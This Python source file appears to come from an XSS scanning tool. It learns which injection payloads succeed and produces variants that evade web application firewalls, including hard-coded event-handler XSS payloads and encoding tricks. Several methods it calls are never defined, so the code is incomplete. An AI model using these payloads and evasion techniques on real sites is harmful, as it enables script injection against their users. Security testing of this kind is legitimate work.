import numpy as np
import pickle
import json
from datetime import datetime
from typing import Dict, List, Tuple

# Try to import AI dependencies with fallback
try:
    import tensorflow as tf
    TENSORFLOW_AVAILABLE = True
except ImportError:
    TENSORFLOW_AVAILABLE = False
    print("Warning: tensorflow not available. Adaptive learning will use fallback methods.")

from sklearn.ensemble import RandomForestClassifier

class AdaptiveLearningEngine:
    """
    Real-time learning engine that adapts to new XSS patterns
    and improves payload generation based on success rates
    """
    
    def __init__(self):
        print("🧠 Initializing Adaptive Learning Engine...")
        
        self.success_model = RandomForestClassifier(n_estimators=100)
        self.failure_patterns = []
        self.success_patterns = []
        self.waf_signatures = {}
        self.learning_data = []
        
        # Neural network for pattern recognition (if available)
        self.pattern_network = None
        if TENSORFLOW_AVAILABLE:
            try:
                self.pattern_network = self._build_pattern_network()
                print("✅ Neural network initialized")
            except Exception as e:
                print(f"Warning: Could not initialize neural network: {e}")
        
        print("✅ Adaptive Learning Engine ready!")
    
    def _build_pattern_network(self):
        """Build neural network for pattern learning"""
        if not TENSORFLOW_AVAILABLE:
            return None
            
        try:
            model = tf.keras.Sequential([
                tf.keras.layers.Dense(256, activation='relu', input_shape=(100,)),
                tf.keras.layers.Dropout(0.3),
                tf.keras.layers.Dense(128, activation='relu'),
                tf.keras.layers.Dropout(0.2),
                tf.keras.layers.Dense(64, activation='relu'),
                tf.keras.layers.Dense(32, activation='relu'),
                tf.keras.layers.Dense(1, activation='sigmoid')  # Success probability
            ])
            
            model.compile(
                optimizer='adam',
                loss='binary_crossentropy',
                metrics=['accuracy']
            )
            
            return model
        except Exception as e:
            print(f"Warning: Could not build pattern network: {e}")
            return None
    
    def learn_from_result(self, payload: str, context: Dict, success: bool, response_data: Dict):
        """Learn from payload test results"""
        print(f"📚 Learning from {'successful' if success else 'failed'} payload...")
        
        # Extract features
        features = self._extract_payload_features(payload, context)
        
        # Store learning data
        learning_entry = {
            'timestamp': datetime.now().isoformat(),
            'payload': payload,
            'context': context,
            'features': features,
            'success': success,
            'response_data': response_data
        }
        
        self.learning_data.append(learning_entry)
        
        # Update patterns
        if success:
            self.success_patterns.append({
                'payload': payload,
                'features': features,
                'context': context
            })
            print("✅ Added to success patterns")
        else:
            self.failure_patterns.append({
                'payload': payload,
                'features': features,
                'context': context,
                'reason': self._analyze_failure_reason(response_data)
            })
            print("❌ Added to failure patterns")
        
        # Retrain if we have enough data
        if len(self.learning_data) % 50 == 0:
            self._retrain_models()
    
    def predict_success_probability(self, payload: str, context: Dict) -> float:
        """Predict success probability for a payload"""
        features = self._extract_payload_features(payload, context)
        features_array = np.array([features])
        
        if hasattr(self.success_model, 'predict_proba'):
            try:
                probability = self.success_model.predict_proba(features_array)[0][1]
                return float(probability)
            except:
                pass
        
        # Fallback to neural network prediction
        if self.pattern_network:
            try:
                probability = self.pattern_network.predict(features_array)[0][0]
                return float(probability)
            except:
                pass
        
        return 0.5  # Default probability
    
    def generate_adaptive_payloads(self, context: Dict, count: int = 20) -> List[str]:
        """Generate payloads based on learned patterns"""
        print(f"🎯 Generating {count} adaptive payloads...")
        
        adaptive_payloads = []
        
        # Use successful patterns as templates
        for pattern in self.success_patterns[-10:]:  # Use recent successful patterns
            base_payload = pattern['payload']
            
            # Generate variations
            variations = self._generate_payload_variations(base_payload, context)
            adaptive_payloads.extend(variations)
        
        # Generate novel payloads based on failure analysis
        novel_payloads = self._generate_novel_payloads(context)
        adaptive_payloads.extend(novel_payloads)
        
        # Rank by predicted success
        ranked_payloads = self._rank_by_success_prediction(adaptive_payloads, context)
        
        return ranked_payloads[:count]
    
    def partial_fit(self, X, y):
        """Online learning: incrementally update the model with new data (stub)."""
        # TODO: Implement online learning for context classifier
        pass

    def evolve_payloads(self, base_payloads, context, generations=5, population_size=20):
        """Genetic algorithm to evolve payloads for WAF bypass (stub)."""
        # TODO: Implement genetic algorithm for payload evolution
        return base_payloads

    def ingest_feedback(self, feedback_data):
        """Ingest user feedback (true/false positives) for retraining (stub)."""
        # TODO: Store feedback and use for model retraining
        pass
    
    def _extract_payload_features(self, payload: str, context: Dict) -> List[float]:
        """Extract numerical features from payload"""
        features = []
        
        # Basic features
        features.append(len(payload))  # Length
        features.append(payload.count('<'))  # HTML tags
        features.append(payload.count('script'))  # Script tags
        features.append(payload.count('alert'))  # Alert calls
        features.append(payload.count('on'))  # Event handlers
        
        # Encoding features
        features.append(payload.count('%'))  # URL encoding
        features.append(payload.count('&#'))  # HTML encoding
        features.append(payload.count('\\u'))  # Unicode encoding
        
        # Context features
        features.append(len(context.get('injection_points', [])))
        features.append(context.get('risk_score', 0))
        
        # Pad to fixed size (100 features)
        while len(features) < 100:
            features.append(0.0)
        
        return features[:100]
    
    def _generate_payload_variations(self, base_payload: str, context: Dict) -> List[str]:
        """Generate variations of successful payload"""
        variations = []
        
        # Case variations
        variations.append(base_payload.upper())
        variations.append(base_payload.lower())
        
        # Encoding variations
        variations.append(self._url_encode_payload(base_payload))
        variations.append(self._html_encode_payload(base_payload))
        
        # Comment injection
        variations.append(base_payload.replace('<', '<!--comment--><'))
        
        # Space variations
        variations.append(base_payload.replace(' ', '/**/'))
        variations.append(base_payload.replace(' ', '\t'))
        
        return variations
    
    def _generate_novel_payloads(self, context: Dict) -> List[str]:
        """Generate novel payloads based on failure analysis"""
        novel_payloads = []
        
        # Analyze common failure reasons
        failure_reasons = [f['reason'] for f in self.failure_patterns[-20:]]
        
        if 'blocked_by_waf' in failure_reasons:
            # Generate WAF evasion payloads
            novel_payloads.extend(self._generate_waf_evasion_payloads())
        
        if 'csp_blocked' in failure_reasons:
            # Generate CSP bypass payloads
            novel_payloads.extend(self._generate_csp_bypass_payloads())
        
        # Always include cutting-edge payloads
        novel_payloads.extend([
            '<animate/onbegin=alert("AI-Novel")>',
            '<custom-element onclick=alert("AI-Novel")>',
            '<template><script>alert("AI-Novel")</script></template>',
            '<dialog open oncancel=alert("AI-Novel")>',
            '<slot onfocus=alert("AI-Novel") tabindex=1>',
        ])
        
        return novel_payloads
    
    def save_learning_data(self, filepath: str):
        """Save learning data to file"""
        with open(filepath, 'w') as f:
            json.dump(self.learning_data, f, indent=2)
        print(f"💾 Learning data saved to {filepath}")
    
    def load_learning_data(self, filepath: str):
        """Load learning data from file"""
        try:
            with open(filepath, 'r') as f:
                self.learning_data = json.load(f)
            print(f"📁 Learning data loaded from {filepath}")
            self._retrain_models()
        except FileNotFoundError:
            print(f"⚠️ Learning data file not found: {filepath}")

print("🧠 Adaptive Learning Engine created!") 